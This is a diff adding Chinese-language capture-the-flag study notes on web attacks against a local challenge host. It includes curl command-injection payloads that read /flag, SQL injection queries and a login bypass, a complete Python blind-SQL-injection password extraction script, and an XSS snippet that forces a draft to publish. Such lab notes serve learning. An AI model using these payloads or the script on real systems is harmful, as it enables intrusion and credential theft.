@@ -44,3 +44,85 @@ CMDi4
 这两个挑战的核心都是因为使用了shell=True
     --在shell中特殊符号; | & 等会被解释为shell命令，所以会执行多个命令
     --所以在使用shell=True时，需要注意不要将用户输入的内容直接传递给shell，而是需要对用户输入进行过滤
+
+CMDi5
+    --curl "http://challenge/localhost/scenario?path=/challenge/PWN;cat%20/flag>%20/tmp/flag"
+
+CMDi6
+    --curl "http://challenge.localhost/quest?location=/challenge%0Acat%20/flag"
+         在Shell的环境中换行符的作用是等同于分号的，所以会执行两个命令，即使不允许使用|和;也可以通过换行符来执行命令
+
+SQLI3
+    curl -v -X GET "http://challenge.localhost/?query=%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username='admin'%20--"
+SQLI2
+    阅读代码后发现使用了flask.request.args.get("userid") 和 flask.request.args.get("pword")来获取用户输入
+    也就意味必须存在一个userid和pword的参数。
+    并且在阅读发现query = f"SELECT * FROM users WHERE username='{userid}' AND password='{pword}'"
+        --参数并没有被严格过滤，是直接传递给了sql语句
+    --curl -c cookie.txt -X POST "http://challenge.localhost/gateway" -d "userid=admin'--&pword=111"
+        --此时会将admin'-- 传递给sql语句，--会注释掉后面的内容，所以会查询到admin的信息
+        --所使用的--'是为了注释掉后面的内容，防止sql语句报错
+
+SQLI5
+        import requests
+
+        # 目标地址
+        url = "http://challenge.localhost"
+
+        # 包含空格和常见特殊符号的字符集合
+        characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_: -.,@!$#%"
+
+        flag = ""
+
+        # SQL 注入自动化脚本
+        for position in range(1, 100):  # 假设标志的长度最多为 100
+            found = False
+            for char in characters:
+                # 构建盲注的 payload，逐字符检查
+                payload = f"admin' OR SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}' -- "
+
+                # 使用 POST 请求发送 payload
+                response = requests.post(url, data={"username": "admin", "password": payload})
+
+                # 检查响应中是否有 "Hello, admin!"，标志猜测成功
+                if "Hello, admin!" in response.text:
+                    flag += char
+                    print(f"Found character: {char} | Current flag: {flag}")
+                    found = True
+                    break  # 继续猜测下一位置
+
+            # 如果没有找到匹配字符，说明已到达标志结束
+            if not found:
+                print("Password extraction complete.")
+                break
+
+        print(f"Final flag: {flag}")
+
+SUBSTR(string, start_position, length)
+    --string: 要提取的字符串
+    --start_position: 要提取的字符串的起始位置
+    --length: 要提取的字符串的长度
+
+payload = f"admin' OR SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}' -- "
+    --admin' 此时的引号用于结束前
+    
+
+
+
+<script>
+fetch('/draft')
+.then(response => response.text())
+.then(data => { console.log(data); window.location.href = '/publish'; }) //这个跳转是十分关键的，尤其是href可以让页面跳转到publish
+.catch(error => console.error('Error:', error)); //这个也十分重要，如果不把错误打印出来，那么就会一直显示错误，而不是在控制台显示错误
+</script>
+
+fetch
+    --fetch() 方法用于从网络获取资源（文本、图片等）
+    --then(response => response.text())  
+        --第一个response为一个参数，代表fetch()方法返回的结果，之后通过箭头转化为text文件
+    --then(data => { console.log(data); window.location.href = '/publish'; })
+        --第二个data为一个参数，代表上一个then()方法返回的结果，通过console.log()方法打印到控制台
+        --window.location.href = '/publish'; 用于跳转到publish页面
+
+此时增加的window.location.href
+    --是因为原服务器代码在跳转到publish页面时，会自动提交所有的草稿，所以需要在跳转到publish页面时，将草稿提交。
